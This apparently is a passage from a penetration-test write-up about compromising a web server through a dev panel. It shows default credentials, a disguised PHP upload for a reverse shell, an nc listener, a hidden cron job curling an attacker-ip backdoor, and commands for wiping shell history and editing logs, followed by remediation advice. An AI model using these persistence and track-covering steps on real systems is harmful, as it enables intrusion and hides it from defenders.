# Gaining Access

- `/admin-dev/` panel used default credentials: `admin:admin`
- Upload feature lacked validation â€” accepted `.php` with `.jpg` extension
- Reverse shell uploaded and executed

```bash
nc -lvnp 4444


Gained shell as www-data

# Maintaining Access

- Placed a PHP reverse shell in an unused media folder (`/assets/uploads`)
- Added a hidden cron job to ping back every 10 minutes:
```bash
*/10 * * * * curl http://attacker-ip/backdoor.php


Maintained access even after admin logout and server restart

- Cleared `.bash_history`:
```bash
cat /dev/null > ~/.bash_history


Deleted uploaded reverse shell after session closed

Modified access logs to remove attacker IP:

## Methodology: 5-Phase Model

| Phase | Action Taken | Risk Level |
|-------|---------------|-------------|
| Recon | Found exposed Git config & dev subdomain | Medium |
| Scanning | Found dev panel & backup file | High |
| Gaining Access | Exploited default admin credentials | Critical |
| Maintaining Access | Uploaded persistent shell | Critical |
| Covering Tracks | Simulated OPSEC â€“ log deletion | High |

---

## Recommendations

- Block access to `.git/`, `/backup.zip`, and dev subdomains
- Enforce strong credential policies
- Limit upload file types and sanitize inputs
- Monitor cron activity and unusual outbound traffic

**Status:** Full remediation in progress
